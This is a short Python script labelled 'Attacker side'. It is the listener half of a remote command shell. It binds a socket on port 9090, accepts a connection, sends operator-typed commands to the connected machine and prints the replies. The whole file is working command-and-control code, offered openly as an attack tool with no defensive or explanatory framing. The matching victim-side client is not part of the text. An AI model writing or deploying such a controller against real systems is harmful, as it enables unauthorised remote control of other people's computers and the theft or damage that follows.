# Attacker side
import socket
from colorama import Fore, Style

# config server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 9090))#change this

s.listen(5)
con, addr = s.accept()


print(Fore.GREEN + "Connection from [{0}]".format(addr) + Style.RESET_ALL)
print()
while 1:
    com = str(input("Input command: "))
    con.send(com.encode('utf-8'))

    #exit
    if com.lower() == 'exit':
        print("exiting...")
        break

    resp = con.recv(1024)
    print(resp.decode('utf-8'))

con.close()
s.close()